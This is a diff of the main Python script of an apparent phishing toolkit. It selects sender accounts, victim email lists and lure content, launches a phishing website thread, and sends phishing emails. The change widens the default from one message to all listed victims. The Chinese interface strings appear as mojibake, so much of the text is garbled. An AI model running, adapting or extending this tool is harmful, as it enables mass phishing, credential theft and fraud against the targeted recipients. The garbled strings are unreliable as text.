@@ -8,33 +8,33 @@ from time import sleep
 
 def check_return_list_and_print(return_list):
     '''
-    ¼ì²é·µ»ØÁĞ±í²¢´òÓ¡½á¹û£¬ÅĞ¶ÏÓÊ¼şÊÇ·ñ·¢ËÍ³É¹¦¡£
+    æ£€æŸ¥è¿”å›åˆ—è¡¨å¹¶æ‰“å°ç»“æœï¼Œåˆ¤æ–­é‚®ä»¶æ˜¯å¦å‘é€æˆåŠŸã€‚
 
-    ²ÎÊı:
-    return_list (list): °üº¬·¢ËÍ½á¹ûµÄÁĞ±í¡£
+    å‚æ•°:
+    return_list (list): åŒ…å«å‘é€ç»“æœçš„åˆ—è¡¨ã€‚
     '''
     if return_list is not None and len(return_list) >= 2:
-        print("·¢ËÍ³É¹¦!")
-        print(f'·¢ËÍ·½ÓÊÏä£º\n[0]{return_list[0]}')
-        print('ÊÜº¦ÕßÓÊÏä£º')
+        print("å‘é€æˆåŠŸ!")
+        print(f'å‘é€æ–¹é‚®ç®±ï¼š\n[0]{return_list[0]}')
+        print('å—å®³è€…é‚®ç®±ï¼š')
         for index in range(1, len(return_list)):
             print(f'[{index}] {return_list[index]}', end='\t')
             if index % 2 == 0:
                 print()
         print()
     elif return_list is not None and len(return_list) == 1:
-        print("Î´·¢ËÍ!")
-        print(f'·¢ËÍÕßÓÊÏä£º\n{return_list[0]}')
+        print("æœªå‘é€!")
+        print(f'å‘é€è€…é‚®ç®±ï¼š\n{return_list[0]}')
     else:
-        print("·¢ËÍÊ§°Ü!")
+        print("å‘é€å¤±è´¥!")
 
 
 def show_dic(dic):
     '''
-    Õ¹Ê¾×Öµä£¬ÓÃÓÚÑ¡ÔñÊı¾İÎÄ¼ş¡£
+    å±•ç¤ºå­—å…¸ï¼Œç”¨äºé€‰æ‹©æ•°æ®æ–‡ä»¶ã€‚
 
-    ²ÎÊı£º
-    dic (dict): ±»Õ¹Ê¾µÄ×Öµä
+    å‚æ•°ï¼š
+    dic (dict): è¢«å±•ç¤ºçš„å­—å…¸
     '''
     for i, (key, value) in enumerate(dic.items()):
         if i % 2 == 0 and i != 0: print()
@@ -44,10 +44,10 @@ def show_dic(dic):
 
 def show_data(data):
     '''
-    Õ¹Ê¾Êı¾İ£¬ÓÃÓÚä¯ÀÀÊı¾İÄÚÈİ¡£
+    å±•ç¤ºæ•°æ®ï¼Œç”¨äºæµè§ˆæ•°æ®å†…å®¹ã€‚
 
-    ²ÎÊı£º
-    data (dict or list): ±»Õ¹Ê¾µÄÊı¾İ
+    å‚æ•°ï¼š
+    data (dict or list): è¢«å±•ç¤ºçš„æ•°æ®
     '''
     if isinstance(data, dict):
         for key, value in data.items():
@@ -67,50 +67,50 @@ if __name__ == '__main__':
     website_thread = None
 
     while sender_data is None:
-        print('ÉèÖÃ·¢ËÍ·½Êı¾İ£º')
+        print('è®¾ç½®å‘é€æ–¹æ•°æ®ï¼š')
         dic = DataManager.get_all_senders_dic()
         show_dic(dic)
-        choose = int(input("Ñ¡Ôñ£º"))
+        choose = int(input("é€‰æ‹©ï¼š"))
         if choose in dic.keys():
             sender_data = DataManager.get_sender(dic[choose])
         else:
-            print('ÎŞĞ§ÊäÈë£¬ÖØĞÂÑ¡Ôñ')
+            print('æ— æ•ˆè¾“å…¥ï¼Œé‡æ–°é€‰æ‹©')
         print()
 
     while victims_data is None:
-        print('ÉèÖÃÊÜº¦ÕßÊı¾İ£º')
+        print('è®¾ç½®å—å®³è€…æ•°æ®ï¼š')
         dic = DataManager.get_all_victims_dic()
         show_dic(dic)
-        choose = int(input("Ñ¡Ôñ£º"))
+        choose = int(input("é€‰æ‹©ï¼š"))
         if choose in dic.keys():
             victims_data = DataManager.get_victims(dic[choose])
         else:
-            print('ÎŞĞ§ÊäÈë£¬ÖØĞÂÑ¡Ôñ')
+            print('æ— æ•ˆè¾“å…¥ï¼Œé‡æ–°é€‰æ‹©')
         print()
 
     while content_data is None:
-        print('ÉèÖÃÄÚÈİÊı¾İ£º')
+        print('è®¾ç½®å†…å®¹æ•°æ®ï¼š')
         dic = DataManager.get_all_contents_dic()
         show_dic(dic)
-        choose = int(input("Ñ¡Ôñ£º"))
+        choose = int(input("é€‰æ‹©ï¼š"))
         if choose in dic.keys():
             content_data = DataManager.get_content(dic[choose])
             if content_data['Content Type'] == 'URL' or content_data['Content Type'] == 'HTML':
-                print("Æô¶¯µöÓãÍøÕ¾ÖĞ¡­¡­")
+                print("å¯åŠ¨é’“é±¼ç½‘ç«™ä¸­â€¦â€¦")
                 website_thread = Thread(target=PhishWebsite.run)
                 website_thread.start()
                 is_phish_website_running = True
                 sleep(0.5)
         else:
-            print('ÎŞĞ§ÊäÈë£¬ÖØĞÂÑ¡Ôñ')
+            print('æ— æ•ˆè¾“å…¥ï¼Œé‡æ–°é€‰æ‹©')
         print()
 
     phish_email = PhishEmail(sender_data, victims_data, content_data)
     if is_phish_website_running: PhishWebsite.set_phish_email(phish_email)
 
     while True:
-        print('²Ëµ¥£º\n[1] ä¯ÀÀ·¢ËÍ·½Êı¾İ\n[2] ä¯ÀÀÊÜº¦ÕßÊı¾İ\n[3] ä¯ÀÀÄÚÈİÊı¾İ\n[4] ·¢ËÍµöÓãÓÊ¼ş\n[0] ·ÅÆú·¢ËÍÓÊ¼ş')
-        choose = int(input("Ñ¡Ôñ£º"))
+        print('èœå•ï¼š\n[1] æµè§ˆå‘é€æ–¹æ•°æ®\n[2] æµè§ˆå—å®³è€…æ•°æ®\n[3] æµè§ˆå†…å®¹æ•°æ®\n[4] å‘é€é’“é±¼é‚®ä»¶\n[0] æ”¾å¼ƒå‘é€é‚®ä»¶')
+        choose = int(input("é€‰æ‹©ï¼š"))
         if choose == 1:
             show_data(sender_data)
         elif choose == 2:
@@ -118,18 +118,18 @@ if __name__ == '__main__':
         elif choose == 3:
             show_data(content_data)
         elif choose == 4:
-            print("·¢ËÍÖĞ¡­¡­")
-            return_list = phish_email.send(1)
+            print("å‘é€ä¸­â€¦â€¦")
+            return_list = phish_email.send()    #åœ¨è¿™é‡Œå¯ä»¥æ§åˆ¶å‘å°„é’“é±¼é‚®ä»¶çš„æ•°é‡ï¼Œé»˜è®¤ä¸ºå‘æ‰€æœ‰å—å®³è€…å‘é€
             check_return_list_and_print(return_list)
             break
         elif choose == 0:
-            print("·ÅÆú·¢ËÍÓÊ¼ş")
+            print("æ”¾å¼ƒå‘é€é‚®ä»¶")
             break
         else:
-            print('ÎŞĞ§ÊäÈë£¬ÖØĞÂÑ¡Ôñ')
+            print('æ— æ•ˆè¾“å…¥ï¼Œé‡æ–°é€‰æ‹©')
 
     print()
     if is_phish_website_running:
-        choose = input('µöÓãÍøÕ¾ÔËĞĞÖĞ¡­¡­')
+        choose = input('é’“é±¼ç½‘ç«™è¿è¡Œä¸­â€¦â€¦')
         print()
-    choose = input('°´ÈÎÒâ¼üÍË³ö³ÌĞò')
+    choose = input('æŒ‰ä»»æ„é”®é€€å‡ºç¨‹åº')
